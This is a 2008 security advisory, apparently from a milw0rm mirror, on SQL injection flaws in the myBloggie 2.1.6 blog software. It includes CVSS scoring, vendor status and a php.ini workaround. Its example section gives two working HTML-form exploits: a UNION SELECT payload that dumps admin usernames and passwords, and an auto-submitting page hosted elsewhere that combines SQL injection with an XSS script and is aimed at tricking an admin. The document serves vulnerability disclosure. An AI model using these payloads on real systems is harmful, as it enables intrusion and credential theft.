<html><head><title>myBloggie 2.1.6 Multiple Remote SQL Injection Vulnerabilities</title></head><pre>netVigilance Security Advisory #40

myBloggie version 2.1.6 Multiple SQL Injection Vulnerability
Description:
myBloggie (http://mywebland.com/mybloggie/) is considered one of the 
most simple, user-friendliest yet packed with features Weblog system 
available to date. Built using PHP &amp; mySQL, web most popular scripting 
language &amp; database system enable myBloggie to be installed in any 
webservers.
A security problem in the product allows attackers to commit SQL injection.
External References:
Mitre CVE: CVE-2007-1899 
http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-1899
NVD NIST: CVE-2007-1899 http://nvd.nist.gov/nvd.cfm?cvename=CVE-2007-1899
OSVDB:

Summary:
myBloggie is weblog system built using PHP &amp; mySQL, the webs most 
popular scripting language &amp; database system which enable myBloggie to 
be installed in any webserver.

Successful exploitation requires PHP magic_quotes_gpc set to Off and 
register_globals set to “On”.
Advisory URL:
http://www.netvigilance.com/advisory0040

Release Date: June 30th 2008

Severity/Risk: Medium

CVSS 2.0 Metrics
Access Vector: Network
Access Complexity: High
Authentication: Not-required
Confidentiality Impact: Partial
Integrity Impact: Partial
Availability Impact: Partial
CVSS 2.0 Base Score: 5.1

Target Distribution on Internet: Low

Exploitability: Functional Exploit
Remediation Level: Workaround
Report Confidence: Uncorroborated

Vulnerability Impact: Attack
Host Impact: SQL Injection.

SecureScout Testcase ID: TC 17969

Vulnerable Systems:
myBloggie version 2.1.6

Vulnerability Type:
SQL injection allows malicious people to execute their own SQL scripts. 
This could be exploited to obtain sensitive data, modify database 
contents or acquire administrator’s privileges.

Vendor:
myWebland (http://mywebland.com/)

Vendor Status:
The Vendor has been notified April 9th 2007, but did not respond.
Workaround:
In the php.ini file set magic_quotes_gpc = On and/or register_globals=Off

Example:

SQL Injection Vulnerability 1:
Create html file with the next content:
&lt;html&gt;
&lt;body&gt;
&lt;form 
action=&quot;http://[TARGET]/[MYBLOGGIE-DIRECTORY]/index.php?mode=viewuser&quot; 
method=&quot;POST&quot;&gt;
&lt;input type=&quot;submit&quot; name=&quot;user_id&quot; value=&quot;1 #' UNION SELECT 
CONCAT(`mb_user`.`user`,' -&gt; ',`mb_user`.`password`),1,1,1,1,1,1,1,1,1 
FROM `mb_user` /*&quot;&gt;
&lt;/form&gt;
&lt;/body&gt;
&lt;/html&gt;

REQUEST:
Browse this file and click on the button
REPLY:
&lt;tr&gt;&lt;td colspan=&quot;3&quot; class=&quot;spacer6&quot;&gt;&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td&gt;&lt;/td&gt;&lt;td&gt;&lt;/td&gt;&lt;td align=&quot;right&quot;&gt;
&lt;span class=&quot;f10pxgrey&quot;&gt;Category : &lt;a class=&quot;std&quot; 
href=&quot;?mode=viewcat&amp;amp;cat_id=1&quot;&gt;
[SQL INJECTION RESULT - ADMIN NAME] -&gt; [SQL INJECTION RESULT - ADMIN 
PASSWORD]&lt;/a&gt;
Posted By : &lt;b&gt;1&lt;/b&gt; | &lt;img src=&quot;./templates/aura/images/comment.gif&quot; 
alt=&quot;&quot; /&gt;
&lt;a class=&quot;std&quot; href=&quot;?mode=viewid&amp;amp;post_id=1&quot;&gt;Comments&lt;/a&gt;[1] |
&lt;img src=&quot;./templates/aura/images/trackback.gif&quot; /&gt;

SQL Injection Vulnerability 2:

(SQL Injection + XSS Attack Vulnerability)
Create html file with the next content and place it for example on 
http://somedomain.com/file.html:
&lt;html&gt;
&lt;body onLoad=&quot;document.forms(0).submit();&quot;&gt;
&lt;form action=&quot; 
http://[TARGET]/[MYBLOGGIE-DIRECTORY]/admin.php?mode=edit&quot; 
method=&quot;POST&quot;&gt; &lt;input type=&quot;hidden&quot; name=&quot;post_id&quot; value=&quot;-1' UNION 
SELECT 1,2, CONCAT(`mb_user`.`user`,' -&gt; ', `mb_user`.`password`), 
'&lt;/textarea&gt;&lt;script&gt;alert(document.post.subject.value)&lt;/script&gt;', 5,6,7 
FROM `mb_user`#&quot;&gt;
&lt;/form&gt;
&lt;/body&gt;
&lt;/html&gt;
REQUEST:
Induce a Mybloggie admin to browse the malicious page.
http:// somedomain.com/file.html

REPLY:
Page containing username and password for Mybloggie admin account.


Credits:
Jesper Jurcenoks
Co-founder netVigilance, Inc
www.netvigilance.com

# milw0rm.com [2008-06-30]</pre></html>